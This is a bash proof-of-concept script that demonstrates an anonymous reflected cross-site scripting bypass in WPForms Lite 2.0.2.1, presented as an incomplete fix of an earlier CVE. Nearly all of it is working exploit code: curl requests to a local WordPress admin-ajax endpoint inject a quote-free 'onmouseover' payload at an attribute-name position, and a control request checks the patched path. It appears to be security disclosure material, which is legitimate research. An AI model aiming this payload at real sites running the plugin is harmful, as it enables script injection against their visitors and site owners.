#!/bin/bash
# PoC: WPForms Lite 2.0.2.1 — incomplete fix of CVE-2026-88996
# Anonymous reflected XSS via smart tag at attribute-NAME position.
# Rig: WP 7.1.2 + WPForms Lite 2.0.2.1, form 17 on page 18 with confirmation:
#   A:<input value="{field_id="3"}"> B:<input {field_id="3"}> C:<a href="{field_id="3"}">l</a>
# (form-export JSON to recreate the form is in form-export.json)
BASE="http://localhost:8090/wp-admin/admin-ajax.php"

echo "[1] attr-NAME position (bypass) — quote-free payload, no nonce, anonymous:"
curl -s -X POST "$BASE" \
  --data "action=wpforms_submit" \
  --data "wpforms[id]=17" --data "wpforms[post_id]=18" \
  --data "wpforms[fields][1][first]=Anon" --data "wpforms[fields][1][last]=Attacker" \
  --data "wpforms[fields][2]=anon@attacker.test" \
  --data 'wpforms[fields][3]=onmouseover=alert(document.domain)' \
  --data "wpforms[fields][4]=x" --data "wpforms[submit]=Submit" \
| python3 -c "import json,sys; print(json.load(sys.stdin)['data']['confirmation'])"
# -> B renders LIVE: <input onmouseover=alert(document.domain)>
#    (A and C inert: value/href quoted positions)

echo
echo "[2] control — attr-VALUE position with quote-breaking payload (parent-CVE shape, fixed):"
curl -s -X POST "$BASE" \
  --data "action=wpforms_submit" \
  --data "wpforms[id]=17" --data "wpforms[post_id]=18" \
  --data "wpforms[fields][1][first]=Anon" --data "wpforms[fields][1][last]=Attacker" \
  --data "wpforms[fields][2]=anon@attacker.test" \
  --data 'wpforms[fields][3]=x" onfocus=alert(1) autofocus y="' \
  --data "wpforms[fields][4]=x" --data "wpforms[submit]=Submit" \
| python3 -c "import json,sys; print(json.load(sys.stdin)['data']['confirmation'])"
# -> ALL positions escaped (&quot; / &#32;) — demonstrates the 2.0.2.1 fix works
#    everywhere EXCEPT attribute-NAME placement with quote-free payloads.
